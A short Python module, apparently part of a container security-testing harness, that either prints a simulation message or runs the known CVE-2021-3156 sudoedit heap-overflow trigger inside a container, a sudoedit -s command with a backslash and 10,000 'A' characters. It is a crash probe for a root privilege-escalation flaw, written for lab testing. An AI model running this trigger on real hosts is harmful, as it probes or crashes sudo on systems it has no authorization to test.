# Path: attacks/cve_2021_3156.py

def run(container, simulate=False):
    print("[*] Running sudoedit Heap Overflow (CVE-2021-3156) simulation...")

    if simulate:
        # Simulated execution: no real overflow triggered
        print(f"[SIMULATE] Would attempt to trigger heap buffer overflow in sudoedit inside container '{container.name}'")
        print("[SIMULATE] If vulnerable, attacker could gain root privileges through crafted arguments.")
        return "Simulated run: No buffer manipulation performed."

    try:
        # ⚠️ WARNING: sudoedit Heap Buffer Overflow
        # This vulnerability allows a local attacker to craft arguments that cause sudoedit to overflow memory,
        # leading to potential root privilege escalation.
        # Note: Real exploitation is highly environment-dependent and dangerous to test directly.

        command = "sudoedit -s '\\' `perl -e 'print \"A\" x 10000'`"
        exec_result = container.exec_run(command)
        print(f"[+] sudoedit output: {exec_result.output.decode()}")
        return "Executed: sudoedit with overflow pattern"

    except Exception as e:
        print(f"[!] Exploit failed: {e}")
        return f"Failed: {str(e)}"
